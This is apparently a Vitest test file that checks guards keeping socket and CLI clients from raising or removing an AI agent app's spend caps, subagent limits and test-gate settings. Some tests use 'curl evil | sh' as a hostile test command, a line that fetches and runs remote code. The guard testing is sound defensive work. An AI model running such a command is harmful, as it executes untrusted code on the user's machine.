import { describe, expect, it, vi } from 'vitest'
import { IPC } from '@shared/types'
import type { AppSettings, HostScope, Project } from '@shared/types'
import { DEFAULT_APP_SETTINGS } from '@shared/defaults'

// The dispatcher must load and run without Electron (cli-spec 3.1.1).
vi.mock('electron', () => {
  throw new Error('electron must not be imported by the host dispatcher')
})
vi.mock('../log', () => ({ log: { debug: () => {}, info: () => {}, warn: () => {}, error: () => {} }, logPath: () => '/logs/main.log', logsDir: () => '/logs' }))

const { HostDispatcher } = await import('./dispatcher')
const { desktopOnlyProjectChanges, desktopOnlyProjectMessage, desktopOnlySettingChanges, guardedFieldsOf } = await import('./projectSaveGuard')
const { normalizeSettings } = await import('../store/settings')
const { project: makeProject } = await import('../runtime/testHelpers')
type HostServices = import('./types').HostServices
type RpcInvokeContext = import('./types').RpcInvokeContext
type InvokeContext = import('./types').InvokeContext

const DESKTOP: InvokeContext = { surface: 'desktop', senderId: 1 }
const rpc = (scopes: HostScope[]): RpcInvokeContext => ({ surface: 'socket', grantedScopes: scopes })
const CONFIGURE = rpc(['read', 'operate', 'configure'])

const withLimits = (extra: Record<string, unknown> = {}): Project => ({ ...makeProject({ id: 'proj_a' }), ...extra }) as Project
/** A project with no explicit subagent limits (the test project helper sets some), i.e. one that carries no guarded limit. */
const plain = (extra: Record<string, unknown> = {}): Project => withLimits({ maxSubagentDepth: undefined, maxConcurrentSubagents: undefined, ...extra })

describe('desktopOnlyProjectChanges (pure)', () => {
  const stored = withLimits({ maxDailyUsd: 10, maxMonthlyUsd: 100, onSpendLimit: 'stop', requireTestsPass: true, testCommand: 'npm test', schedulesNearPlanLimit: true })

  it('allows an unchanged copy (a CLI round trip)', () => {
    expect(desktopOnlyProjectChanges(stored, structuredClone(stored))).toEqual([])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits())).toEqual([])
  })

  it('allows lowering a cap, setting one where there was none and turning schedulesNearPlanLimit off', () => {
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 2, maxMonthlyUsd: 100, schedulesNearPlanLimit: false })).toEqual([])
    const { schedulesNearPlanLimit: _drop, ...without } = stored
    void _drop
    expect(desktopOnlyProjectChanges(stored, without as Project)).toEqual([])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ maxDailyUsd: 3 }))).toEqual([])
  })

  it('refuses raising or removing a cap, and a junk cap (it would be dropped, which removes it)', () => {
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 11 })).toEqual(['maxDailyUsd'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxMonthlyUsd: 1e9 })).toEqual(['maxMonthlyUsd'])
    const { maxDailyUsd: _a, maxMonthlyUsd: _b, ...none } = stored
    void _a
    void _b
    expect(desktopOnlyProjectChanges(stored, none as Project)).toEqual(['maxDailyUsd', 'maxMonthlyUsd'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: -1 })).toEqual(['maxDailyUsd'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 'lots' as unknown as number })).toEqual(['maxDailyUsd'])
  })

  it('refuses turning schedulesNearPlanLimit on', () => {
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ schedulesNearPlanLimit: true }))).toEqual(['schedulesNearPlanLimit'])
  })

  describe('the per-run budget (Project.maxBudgetUsd, security review M3)', () => {
    const capped = withLimits({ maxBudgetUsd: 5 })
    it('allows keeping, lowering and setting one where there was none (a budget that was 0 or junk counts as none)', () => {
      expect(desktopOnlyProjectChanges(capped, { ...capped })).toEqual([])
      expect(desktopOnlyProjectChanges(capped, { ...capped, maxBudgetUsd: 2.5 })).toEqual([])
      expect(desktopOnlyProjectChanges(withLimits(), withLimits({ maxBudgetUsd: 3 }))).toEqual([])
      expect(desktopOnlyProjectChanges(withLimits({ maxBudgetUsd: 0 }), withLimits({ maxBudgetUsd: 3 }))).toEqual([])
      expect(desktopOnlyProjectChanges(withLimits({ maxBudgetUsd: 'x' }), withLimits({ maxBudgetUsd: 3 }))).toEqual([])
    })
    it('refuses raising it', () => {
      expect(desktopOnlyProjectChanges(capped, { ...capped, maxBudgetUsd: 5.01 })).toEqual(['maxBudgetUsd'])
      expect(desktopOnlyProjectChanges(capped, { ...capped, maxBudgetUsd: 1_000_000 })).toEqual(['maxBudgetUsd'])
    })
    it('refuses removing it in every spelling: absent, null, 0, negative, junk, Infinity', () => {
      const { maxBudgetUsd: _drop, ...none } = capped
      void _drop
      expect(desktopOnlyProjectChanges(capped, none as Project)).toEqual(['maxBudgetUsd'])
      for (const v of [null, 0, -1, 'none', Number.NaN, Infinity]) {
        expect(desktopOnlyProjectChanges(capped, { ...capped, maxBudgetUsd: v as unknown as number }), String(v)).toEqual(['maxBudgetUsd'])
      }
    })
    it('allows the same junk where there was no cap (nothing to remove)', () => {
      expect(desktopOnlyProjectChanges(withLimits(), withLimits({ maxBudgetUsd: 0 }))).toEqual([])
      expect(desktopOnlyProjectChanges(withLimits({ maxBudgetUsd: 0 }), withLimits())).toEqual([])
    })
  })

  describe('explicit subagent limits (Project.maxSubagentDepth, maxConcurrentSubagents)', () => {
    const explicit = withLimits({ maxSubagentDepth: 2, maxConcurrentSubagents: 3 })
    it('allows keeping and lowering them, setting one where the project was automatic, and an unchanged copy', () => {
      expect(desktopOnlyProjectChanges(explicit, { ...explicit })).toEqual([])
      expect(desktopOnlyProjectChanges(explicit, { ...explicit, maxSubagentDepth: 1, maxConcurrentSubagents: 1 })).toEqual([])
      // The test fixture is explicit (2 and 3); an automatic project has neither field.
      const { maxSubagentDepth: _d, maxConcurrentSubagents: _c, ...auto } = withLimits()
      void _d
      void _c
      expect(desktopOnlyProjectChanges(auto as Project, { ...auto, maxSubagentDepth: 3, maxConcurrentSubagents: 12 } as Project)).toEqual([])
    })
    it('refuses raising an explicit limit', () => {
      expect(desktopOnlyProjectChanges(explicit, { ...explicit, maxSubagentDepth: 3 })).toEqual(['maxSubagentDepth'])
      expect(desktopOnlyProjectChanges(explicit, { ...explicit, maxConcurrentSubagents: 4 })).toEqual(['maxConcurrentSubagents'])
    })
    it('refuses clearing an explicit limit when the automatic value would allow more, and allows it when it would not', () => {
      // Automatic concurrency is the default (more than 3): clearing it raises the limit. Automatic depth for this chart is 2 or 3.
      const tight = withLimits({ maxSubagentDepth: 1, maxConcurrentSubagents: 1 })
      const { maxSubagentDepth: _d, maxConcurrentSubagents: _c, ...auto } = tight
      void _d
      void _c
      expect(desktopOnlyProjectChanges(tight, auto as Project)).toEqual(['maxSubagentDepth', 'maxConcurrentSubagents'])
      const loose = withLimits({ maxSubagentDepth: 9, maxConcurrentSubagents: 99 })
      expect(desktopOnlyProjectChanges(loose, auto as Project)).toEqual([])
    })
  })

  it('refuses any change to onSpendLimit, requireTestsPass and testCommand', () => {
    expect(desktopOnlyProjectChanges(stored, { ...stored, onSpendLimit: 'pause' })).toEqual(['onSpendLimit'])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ onSpendLimit: 'stop' }))).toEqual(['onSpendLimit'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, requireTestsPass: false })).toEqual(['requireTestsPass'])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ requireTestsPass: true }))).toEqual(['requireTestsPass'])
    expect(desktopOnlyProjectChanges(stored, { ...stored, testCommand: 'curl evil | sh' })).toEqual(['testCommand'])
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ testCommand: 'npm test' }))).toEqual(['testCommand'])
  })

  it('treats a default value as unchanged (missing onSpendLimit is pause, missing requireTestsPass is false)', () => {
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ onSpendLimit: 'pause', requireTestsPass: false, askBeforeStrongerModel: false }))).toEqual([])
  })

  it('refuses any change to branchNamePattern, setting, changing or removing it, and a junk one that would be dropped', () => {
    const withPattern = withLimits({ branchNamePattern: 'orgai/{task}' })
    expect(desktopOnlyProjectChanges(withLimits(), withPattern)).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, withLimits({ branchNamePattern: 'orgai/{role}' }))).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, withLimits())).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, withLimits({ branchNamePattern: '../x' }))).toEqual(['branchNamePattern'])
    expect(desktopOnlyProjectChanges(withPattern, structuredClone(withPattern))).toEqual([])
    // A junk value on a project without one is dropped, so it changes nothing.
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ branchNamePattern: '../x' }))).toEqual([])
  })

  it('refuses any change to askBeforeStrongerModel (a missing flag is false)', () => {
    expect(desktopOnlyProjectChanges(withLimits(), withLimits({ askBeforeStrongerModel: true }))).toEqual(['askBeforeStrongerModel'])
    expect(desktopOnlyProjectChanges(withLimits({ askBeforeStrongerModel: true }), withLimits())).toEqual(['askBeforeStrongerModel'])
    expect(desktopOnlyProjectChanges(withLimits({ askBeforeStrongerModel: true }), withLimits({ askBeforeStrongerModel: false }))).toEqual(['askBeforeStrongerModel'])
    expect(desktopOnlyProjectChanges(withLimits({ askBeforeStrongerModel: true }), withLimits({ askBeforeStrongerModel: true }))).toEqual([])
  })

  it('names every refused field in one plain sentence', () => {
    const fields = desktopOnlyProjectChanges(stored, { ...stored, maxDailyUsd: 50, testCommand: 'x' })
    expect(desktopOnlyProjectMessage(fields)).toBe('These project settings can be changed in the OrgAI window only: maxDailyUsd, testCommand. Limits can be lowered from here, not raised or removed.')
  })

  describe('widening limits (review M5)', () => {
    const role = (id: string, extra: Record<string, unknown> = {}) => ({ ...makeProject().roles[0], id, slug: id, name: id, ...extra })
    const capped = withLimits({
      maxAgentsPerRun: 5,
      mainBranch: 'main',
      keepFailedBranchesDays: 10,
      roles: [role('r1', { maxConcurrent: 3, knowledgeWrite: false }), role('r2')]
    })
    const withRoles = (roles: unknown[]) => ({ ...capped, roles }) as Project

    it('refuses raising or removing maxAgentsPerRun, allows lowering and setting one', () => {
      expect(desktopOnlyProjectChanges(capped, { ...capped, maxAgentsPerRun: 6 })).toEqual(['maxAgentsPerRun'])
      const { maxAgentsPerRun: _m, ...none } = capped
      void _m
      expect(desktopOnlyProjectChanges(capped, none as Project)).toEqual(['maxAgentsPerRun'])
      expect(desktopOnlyProjectChanges(capped, { ...capped, maxAgentsPerRun: 2 })).toEqual([])
      expect(desktopOnlyProjectChanges(withLimits(), withLimits({ maxAgentsPerRun: 9 }))).toEqual([])
    })

    it('refuses raising or removing Role.maxConcurrent, allows lowering and setting one', () => {
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { maxConcurrent: 4, knowledgeWrite: false }), role('r2')]))).toEqual(['Role.maxConcurrent'])
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { knowledgeWrite: false }), role('r2')]))).toEqual(['Role.maxConcurrent'])
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { maxConcurrent: 1, knowledgeWrite: false }), role('r2', { maxConcurrent: 2 })]))).toEqual([])
    })

    it('refuses removing Role.knowledgeWrite false, allows setting it', () => {
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { maxConcurrent: 3 }), role('r2')]))).toEqual(['Role.knowledgeWrite'])
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { maxConcurrent: 3, knowledgeWrite: true }), role('r2')]))).toEqual(['Role.knowledgeWrite'])
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { maxConcurrent: 3, knowledgeWrite: false }), role('r2', { knowledgeWrite: false })]))).toEqual([])
    })

    it('does not count a removed role that carries no limit, and a new role starts uncapped without a refusal', () => {
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1', { maxConcurrent: 3, knowledgeWrite: false }), role('r3')]))).toEqual([])
    })

    it('refuses removing a role that carries a cap or a knowledge restriction (security review M4)', () => {
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r2'), role('r3')]))).toEqual(['Role.maxConcurrent', 'Role.knowledgeWrite'])
      const capOnly = withLimits({ roles: [role('c1', { maxConcurrent: 2 })] })
      expect(desktopOnlyProjectChanges(capOnly, { ...capOnly, roles: [] } as Project)).toEqual(['Role.maxConcurrent'])
      const restrictedOnly = withLimits({ roles: [role('k1', { knowledgeWrite: false })] })
      expect(desktopOnlyProjectChanges(restrictedOnly, { ...restrictedOnly, roles: [] } as Project)).toEqual(['Role.knowledgeWrite'])
    })

    it('refuses the same role re-added under a new id, by slug or by name, even when it keeps the cap (security review M4)', () => {
      const swapped = (over: Record<string, unknown>) => withRoles([{ ...role('r1-new', { maxConcurrent: 3, knowledgeWrite: false }), ...over }, role('r2')])
      expect(desktopOnlyProjectChanges(capped, swapped({ slug: 'r1', name: 'Other' }))).toEqual(['Role.maxConcurrent', 'Role.knowledgeWrite'])
      expect(desktopOnlyProjectChanges(capped, swapped({ slug: 'other', name: 'R1' }))).toEqual(['Role.maxConcurrent', 'Role.knowledgeWrite'])
      // The uncapped re-add the finding describes.
      expect(desktopOnlyProjectChanges(capped, withRoles([role('r1-new'), role('r2')]))).toEqual(['Role.maxConcurrent', 'Role.knowledgeWrite'])
    })

    it('refuses a second role with the same slug or name that lacks the limit while the original stays (security review M4)', () => {
      const kept = role('r1', { maxConcurrent: 3, knowledgeWrite: false })
      expect(desktopOnlyProjectChanges(capped, withRoles([kept, role('r9', { slug: 'r1', name: 'Sneaky' }), role('r2')]))).toEqual(['Role.maxConcurrent', 'Role.knowledgeWrite'])
      expect(desktopOnlyProjectChanges(capped, withRoles([kept, role('r9', { slug: 'sneaky', name: 'r1' }), role('r2')]))).toEqual(['Role.maxConcurrent', 'Role.knowledgeWrite'])
      expect(desktopOnlyProjectChanges(capped, withRoles([kept, role('r9', { slug: 'r1', name: 'R1', maxConcurrent: 2, knowledgeWrite: false }), role('r2')]))).toEqual([])
    })

    it('refuses setting or lowering keepFailedBranchesDays, allows raising, clearing and keeping it', () => {
      expect(desktopOnlyProjectChanges(capped, { ...capped, keepFailedBranchesDays: 3 })).toEqual(['keepFailedBranchesDays'])
      expect(desktopOnlyProjectChanges(withLimits(), withLimits({ keepFailedBranchesDays: 30 }))).toEqual(['keepFailedBranchesDays'])
      expect(desktopOnlyProjectChanges(capped, { ...capped, keepFailedBranchesDays: 30 })).toEqual([])
      const { keepFailedBranchesDays: _k, ...cleared } = capped
      void _k
      expect(desktopOnlyProjectChanges(capped, cleared as Project)).toEqual([])
      expect(desktopOnlyProjectChanges(capped, structuredClone(capped))).toEqual([])
    })

    it('refuses any change to mainBranch', () => {
      expect(desktopOnlyProjectChanges(capped, { ...capped, mainBranch: 'evil' })).toEqual(['mainBranch'])
      expect(desktopOnlyProjectChanges(withLimits(), withLimits({ mainBranch: 'main' }))).toEqual(['mainBranch'])
      const { mainBranch: _b, ...none } = capped
      void _b
      expect(desktopOnlyProjectChanges(capped, none as Project)).toEqual(['mainBranch'])
    })

    it('refuses the widening through projects:save from a socket client', async () => {
      const store = { get: () => capped, list: () => [capped], saveFromRenderer: vi.fn((p: Project) => p) }
      const settings = { get: () => DEFAULT_APP_SETTINGS, dataDir: '/data', set: vi.fn() }
      const d = new HostDispatcher({
        projects: store as never, runs: { list: () => [] } as never, setup: {} as never, maintenance: {} as never, settings: settings as never,
        connections: { effectiveSettings: () => settings.get(), effectiveDefault: () => 'anthropic' } as never, mcp: {} as never, adapterIds: ['mock'],
        harnessProject: () => makeProject({ id: 'harness', roles: [] }), importer: {} as never, skills: {} as never, skillEvaluation: {} as never,
        capabilities: {} as never, quick: {} as never, templates: { list: () => [] } as never
      })
      await expect(d.invokeRpc(IPC.projectsSave, [{ ...capped, maxAgentsPerRun: 50 }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('maxAgentsPerRun') as unknown as string })
      await expect(d.invokeRpc(IPC.projectsSave, [{ ...capped, mainBranch: 'x' }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied' })
      expect(store.saveFromRenderer).not.toHaveBeenCalled()
      await d.invokeRpc(IPC.projectsSave, [{ ...capped, maxAgentsPerRun: 1 }], CONFIGURE)
      expect(store.saveFromRenderer).toHaveBeenCalledTimes(1)
    })
  })
})

describe('desktopOnlySettingChanges (pure)', () => {
  const stored: AppSettings = { ...DEFAULT_APP_SETTINGS, openAtLogin: false, closeBehavior: 'quit', keepAwakeDuringRuns: false, spendWarnPercent: 80 }

  it('allows an unchanged copy, junk equal to the default and the harmless display preferences', () => {
    expect(desktopOnlySettingChanges(stored, { ...stored })).toEqual([])
    expect(desktopOnlySettingChanges(stored, { ...stored, playSound: true, notifyNeedsMe: false, notifyRunFinished: false, notifyScheduleFindings: false, dateFormat: 'yyyy-MM-dd' })).toEqual([])
    expect(desktopOnlySettingChanges(DEFAULT_APP_SETTINGS, { ...DEFAULT_APP_SETTINGS, closeBehavior: 'quit', openAtLogin: false })).toEqual([])
  })

  it('names each of the four guarded fields, in either direction', () => {
    expect(desktopOnlySettingChanges(stored, { ...stored, openAtLogin: true })).toEqual(['openAtLogin'])
    expect(desktopOnlySettingChanges(stored, { ...stored, closeBehavior: 'keepRunning' })).toEqual(['closeBehavior'])
    expect(desktopOnlySettingChanges(stored, { ...stored, keepAwakeDuringRuns: true })).toEqual(['keepAwakeDuringRuns'])
    expect(desktopOnlySettingChanges(stored, { ...stored, spendWarnPercent: 95 })).toEqual(['spendWarnPercent'])
    expect(desktopOnlySettingChanges(stored, { ...stored, spendWarnPercent: null })).toEqual(['spendWarnPercent'])
    expect(desktopOnlySettingChanges({ ...stored, spendWarnPercent: null }, { ...stored, spendWarnPercent: 60 })).toEqual(['spendWarnPercent'])
    expect(desktopOnlySettingChanges({ ...stored, openAtLogin: true }, { ...stored, openAtLogin: false })).toEqual(['openAtLogin'])
  })
})

describe('settings:set surfaces (review H1)', () => {
  function setup(initial: AppSettings) {
    let current = initial
    const settings = { get: () => current, dataDir: '/data', set: vi.fn((next: AppSettings) => void (current = normalizeSettings(next))) }
    const services: HostServices = {
      projects: { get: () => null, list: () => [] } as never,
      runs: { list: () => [] } as never,
      setup: {} as never,
      maintenance: {} as never,
      settings: settings as never,
      connections: { effectiveSettings: () => settings.get(), effectiveDefault: () => 'anthropic' } as never,
      mcp: {} as never,
      adapterIds: ['mock'],
      harnessProject: () => makeProject({ id: 'harness', roles: [] }),
      importer: {} as never,
      skills: {} as never,
      skillEvaluation: {} as never,
      capabilities: {} as never,
      quick: {} as never,
      templates: { list: () => [] } as never
    }
    return { d: new HostDispatcher(services), settings, now: () => current }
  }
  const inproc: InvokeContext = { surface: 'inproc', grantedScopes: ['read', 'operate', 'configure'] } as InvokeContext
  const guarded = [{ openAtLogin: true }, { closeBehavior: 'keepRunning' }, { keepAwakeDuringRuns: true }, { spendWarnPercent: 90 }]

  it('refuses each guarded field from a socket client and the in-process CLI, and stores nothing', async () => {
    const base = normalizeSettings(null)
    for (const change of guarded) {
      const { d, settings } = setup(base)
      await expect(d.invokeRpc(IPC.settingsSet, [{ ...base, ...change }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining(Object.keys(change)[0]) as unknown as string })
      await expect(async () => d.invoke(IPC.settingsSet, [{ ...base, ...change }], inproc)).rejects.toMatchObject({ code: 'scope_denied' })
      expect(settings.set).not.toHaveBeenCalled()
    }
  })

  it('refuses turning a stored guarded setting off from a non-desktop surface', async () => {
    const base = normalizeSettings({ ...DEFAULT_APP_SETTINGS, openAtLogin: true, spendWarnPercent: 80 })
    const { d, settings } = setup(base)
    await expect(d.invokeRpc(IPC.settingsSet, [{ ...base, openAtLogin: false }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied' })
    await expect(d.invokeRpc(IPC.settingsSet, [{ spendWarnPercent: null }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied' })
    expect(settings.set).not.toHaveBeenCalled()
  })

  it('lets an unchanged round trip and the display preferences through from a socket client', async () => {
    const base = normalizeSettings({ ...DEFAULT_APP_SETTINGS, openAtLogin: true, spendWarnPercent: 80 })
    const { d, settings, now } = setup(base)
    await d.invokeRpc(IPC.settingsSet, [{ ...base }], CONFIGURE)
    await d.invokeRpc(IPC.settingsSet, [{ playSound: true, dateFormat: 'yyyy-MM-dd', notifyRunFinished: false }], CONFIGURE)
    expect(settings.set).toHaveBeenCalledTimes(2)
    expect(now()).toMatchObject({ playSound: true, notifyRunFinished: false, openAtLogin: true, spendWarnPercent: 80 })
  })

  it('lets the desktop change all four, including spendWarnPercent between a number and null (review M8)', async () => {
    const { d, now } = setup(normalizeSettings(null))
    await d.invoke(IPC.settingsSet, [{ openAtLogin: true, closeBehavior: 'keepRunning', keepAwakeDuringRuns: true, spendWarnPercent: 75 }], DESKTOP)
    expect(now()).toMatchObject({ openAtLogin: true, closeBehavior: 'keepRunning', keepAwakeDuringRuns: true, spendWarnPercent: 75 })
    await d.invoke(IPC.settingsSet, [{ spendWarnPercent: null }], DESKTOP)
    expect(now().spendWarnPercent).toBeNull()
    await d.invoke(IPC.settingsSet, [{ spendWarnPercent: 90 }], DESKTOP)
    expect(now().spendWarnPercent).toBe(90)
  })
})

describe('projects:save from a non-desktop surface', () => {
  function setup(stored: Project) {
    const settings = { get: () => DEFAULT_APP_SETTINGS, dataDir: '/data', set: vi.fn() }
    const saveFromRenderer = vi.fn((p: Project) => p)
    const services: HostServices = {
      projects: { get: (id: string) => (id === stored.id ? stored : null), list: () => [stored], saveFromRenderer } as never,
      runs: { list: () => [] } as never,
      setup: {} as never,
      maintenance: {} as never,
      settings: settings as never,
      connections: { effectiveSettings: () => settings.get(), effectiveDefault: () => 'anthropic' } as never,
      mcp: {} as never,
      adapterIds: ['mock'],
      harnessProject: () => makeProject({ id: 'harness', roles: [] }),
      importer: {} as never,
      skills: {} as never,
      skillEvaluation: {} as never,
      capabilities: {} as never,
      quick: {} as never,
      templates: { list: () => [] } as never
    }
    return { d: new HostDispatcher(services), saveFromRenderer }
  }

  const stored = withLimits({ maxDailyUsd: 10, requireTestsPass: false })

  it('refuses a save that raises a cap or sets the test gate, and stores nothing', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, maxDailyUsd: 20 }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied' })
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, requireTestsPass: true, testCommand: 'curl evil | sh' }], CONFIGURE)).rejects.toMatchObject({
      code: 'scope_denied',
      message: expect.stringContaining('requireTestsPass, testCommand') as unknown as string
    })
    expect(saveFromRenderer).not.toHaveBeenCalled()
  })

  it('refuses a save that sets the branch pattern or the stronger-model question, and the desktop may', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, branchNamePattern: 'orgai/{task}' }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('branchNamePattern') as unknown as string })
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...stored, askBeforeStrongerModel: true }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('askBeforeStrongerModel') as unknown as string })
    expect(saveFromRenderer).not.toHaveBeenCalled()
    await d.invoke(IPC.projectsSave, [{ ...stored, branchNamePattern: 'orgai/{task}', askBeforeStrongerModel: true }], DESKTOP)
    expect(saveFromRenderer).toHaveBeenCalledTimes(1)
  })

  it('refuses the in-process surface too', async () => {
    const { d, saveFromRenderer } = setup(stored)
    const inproc: InvokeContext = { surface: 'inproc', grantedScopes: ['read', 'operate', 'configure'] } as InvokeContext
    await expect(async () => d.invoke(IPC.projectsSave, [{ ...stored, testCommand: 'x' }], inproc)).rejects.toMatchObject({ code: 'scope_denied' })
    expect(saveFromRenderer).not.toHaveBeenCalled()
  })

  it('lets an unchanged copy and a lowered cap through', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await d.invokeRpc(IPC.projectsSave, [{ ...stored, name: 'Renamed' }], CONFIGURE)
    await d.invokeRpc(IPC.projectsSave, [{ ...stored, maxDailyUsd: 1 }], CONFIGURE)
    expect(saveFromRenderer).toHaveBeenCalledTimes(2)
  })

  it('refuses raising or removing the per-run budget from a socket client and the in-process surface; lowering and setting one go through; the desktop may do all', async () => {
    const budgeted = withLimits({ maxBudgetUsd: 5 })
    const { d, saveFromRenderer } = setup(budgeted)
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...budgeted, maxBudgetUsd: 50 }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('maxBudgetUsd') as unknown as string })
    await expect(d.invokeRpc(IPC.projectsSave, [{ ...budgeted, maxBudgetUsd: null }], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied' })
    const inproc: InvokeContext = { surface: 'inproc', grantedScopes: ['read', 'operate', 'configure'] } as InvokeContext
    await expect(async () => d.invoke(IPC.projectsSave, [{ ...budgeted, maxBudgetUsd: 0 }], inproc)).rejects.toMatchObject({ code: 'scope_denied' })
    expect(saveFromRenderer).not.toHaveBeenCalled()
    await d.invokeRpc(IPC.projectsSave, [{ ...budgeted, maxBudgetUsd: 1 }], CONFIGURE)
    expect(saveFromRenderer).toHaveBeenCalledTimes(1)
    await d.invoke(IPC.projectsSave, [{ ...budgeted, maxBudgetUsd: 500 }], DESKTOP)
    await d.invoke(IPC.projectsSave, [{ ...budgeted, maxBudgetUsd: null }], DESKTOP)
    expect(saveFromRenderer).toHaveBeenCalledTimes(3)
  })

  it('does not restrict the desktop window', async () => {
    const { d, saveFromRenderer } = setup(stored)
    await d.invoke(IPC.projectsSave, [{ ...stored, maxDailyUsd: 500, requireTestsPass: true, testCommand: 'npm test', onSpendLimit: 'stop' }], DESKTOP)
    expect(saveFromRenderer).toHaveBeenCalledTimes(1)
  })
})

describe('guardedFieldsOf (what removing and re-creating a project would shed)', () => {
  const role0 = makeProject().roles[0]

  it('is empty for a project that carries no guarded limit', () => {
    expect(guardedFieldsOf(plain())).toEqual([])
  })

  it.each([
    ['maxBudgetUsd', { maxBudgetUsd: 5 }],
    ['maxDailyUsd', { maxDailyUsd: 5 }],
    ['maxMonthlyUsd', { maxMonthlyUsd: 50 }],
    ['maxAgentsPerRun', { maxAgentsPerRun: 4 }],
    ['requireTestsPass', { requireTestsPass: true }],
    ['testCommand', { testCommand: 'npm test' }],
    ['onSpendLimit', { onSpendLimit: 'stop' }],
    ['mainBranch', { mainBranch: 'main' }]
  ])('names %s', (name, extra) => {
    expect(guardedFieldsOf(withLimits(extra))).toContain(name)
  })

  it('names a role\'s cap and a role\'s knowledge restriction, and an explicit subagent limit below the automatic one', () => {
    expect(guardedFieldsOf(plain({ roles: [{ ...role0, maxConcurrent: 2 }] }))).toEqual(['Role.maxConcurrent'])
    expect(guardedFieldsOf(plain({ roles: [{ ...role0, knowledgeWrite: false }] }))).toEqual(['Role.knowledgeWrite'])
  })
})

describe('projects:remove from a non-desktop surface (third pass S1b)', () => {
  function setup(stored: Project) {
    const settings = { get: () => DEFAULT_APP_SETTINGS, dataDir: '/data-not-used', set: vi.fn() }
    const remove = vi.fn()
    const removeProject = vi.fn(async () => 0)
    const services: HostServices = {
      projects: { get: (id: string) => (id === stored.id ? stored : null), list: () => [stored], remove } as never,
      runs: { list: () => [], removeProject } as never,
      setup: {} as never,
      maintenance: {} as never,
      settings: settings as never,
      connections: { effectiveSettings: () => settings.get(), effectiveDefault: () => 'anthropic' } as never,
      mcp: { removeProjectSecrets: vi.fn() } as never,
      adapterIds: ['mock'],
      harnessProject: () => makeProject({ id: 'harness', roles: [] }),
      importer: {} as never,
      skills: { removeProjectFiles: vi.fn() } as never,
      skillEvaluation: {} as never,
      capabilities: { forgetProject: vi.fn() } as never,
      quick: {} as never,
      templates: { list: () => [] } as never
    }
    return { d: new HostDispatcher(services), remove, removeProject }
  }
  const inproc: InvokeContext = { surface: 'inproc', grantedScopes: ['read', 'operate', 'configure'] } as InvokeContext

  it.each([
    ['a project budget', { maxBudgetUsd: 5 }],
    ['a daily cap', { maxDailyUsd: 5 }],
    ['an agent cap', { maxAgentsPerRun: 3 }],
    ['the test gate', { requireTestsPass: true, testCommand: 'npm test' }]
  ])('refuses removing a project with %s from a socket client and the in-process surface, and removes nothing', async (_what, extra) => {
    const { d, remove, removeProject } = setup(withLimits(extra))
    await expect(d.invokeRpc(IPC.projectsRemove, ['proj_a'], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('OrgAI window only') as unknown as string })
    await expect(async () => d.invoke(IPC.projectsRemove, ['proj_a'], inproc)).rejects.toMatchObject({ code: 'scope_denied' })
    expect(removeProject).not.toHaveBeenCalled()
    expect(remove).not.toHaveBeenCalled()
  })

  it('refuses it for a role cap too', async () => {
    const role0 = makeProject().roles[0]
    const { d, remove } = setup(plain({ roles: [{ ...role0, maxConcurrent: 1 }] }))
    await expect(d.invokeRpc(IPC.projectsRemove, ['proj_a'], CONFIGURE)).rejects.toMatchObject({ code: 'scope_denied', message: expect.stringContaining('Role.maxConcurrent') as unknown as string })
    expect(remove).not.toHaveBeenCalled()
  })

  it('the desktop window may remove it', async () => {
    const { d, remove } = setup(withLimits({ maxBudgetUsd: 5 }))
    await d.invoke(IPC.projectsRemove, ['proj_a'], DESKTOP)
    expect(remove).toHaveBeenCalledWith('proj_a')
  })

  it('a project with no guarded field is removed from every surface as before', async () => {
    const { d, remove } = setup(plain())
    await d.invokeRpc(IPC.projectsRemove, ['proj_a'], CONFIGURE)
    expect(remove).toHaveBeenCalledWith('proj_a')
  })
})

describe('templates:apply and projects:applyImport from a non-desktop surface (third pass S1c)', () => {
  function setup() {
    const settings = { get: () => DEFAULT_APP_SETTINGS, dataDir: '/data-not-used', set: vi.fn() }
